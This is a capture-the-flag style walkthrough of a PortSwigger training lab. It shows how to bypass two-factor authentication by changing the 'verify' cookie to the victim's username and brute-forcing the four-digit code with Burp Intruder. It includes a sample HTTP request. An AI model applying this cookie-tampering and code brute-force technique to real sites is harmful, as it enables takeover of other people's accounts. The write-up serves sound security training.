## 2FA broken logic

This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

Your credentials: wiener:peter
Victim's username: carlos
You also have access to the email server to receive your 2FA verification code.

Hint

Carlos will not attempt to log in to the website himself.

## Notes

- Possibility to leave a comment on a post
- Exploit server
- /login

## Resume

1. Capture login request
2. Change `verify` cookie to `carlos`
3. Generate Carlos's temporary MFA code
4. Send `POST /login2` to Intruder
5. Sniper attack on `mfa-code`
6. Filter for `302` response
7. Open response in browser and access `/my-account`

## Solve 

Login with your own account and complete the normal 2FA workflow. During the verification step, notice that the application uses the `verify` cookie to determine which account is being authenticated.

Send the **GET /login2** request to Repeater and replace the `verify` cookie with `carlos`.

```
GET /login2 HTTP/2
Host: 0a1a00bc038f9fb281990cc600070080.web-security-academy.net
Cookie: verify=carlos; session=AfFmvgnSNm3HW9xpinVipWdKskJ280XQ
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://0a1a00bc038f9fb281990cc600070080.web-security-academy.net/login

Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Send the request. This generates a valid temporary 2FA code for Carlos.

Now login again using your own credentials. When prompted for the 2FA code, enter any invalid value and send the request to Intruder.

Replace the `verify` cookie with `carlos` and add a payload position on the `mfa-code` parameter.

Use a numeric payload from `0000` to `9999` and start the attack.

Once the attack is finished, look for a **302 status code**. This corresponds to the valid 2FA code.

Open the response in the browser and click **My account** to solve the lab.